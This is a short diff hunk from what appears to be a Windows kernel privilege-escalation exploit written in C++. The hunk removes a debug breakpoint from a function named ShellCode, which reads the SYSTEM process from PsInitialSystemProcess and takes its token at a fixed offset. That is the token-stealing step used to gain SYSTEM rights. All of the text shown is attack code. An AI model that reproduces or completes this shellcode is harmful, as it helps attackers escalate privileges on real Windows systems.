@@ -45,7 +45,6 @@ static auto NtkrnlpaBase() -> LPVOID {
 }
 
 static auto ShellCode() -> void {
-	__debugbreak();
 	auto systemEProcess = *(void**)PsInitialSystemProcess;
 
 	auto systemProcessToken = *(void**)((byte*)systemEProcess + 0xf8);
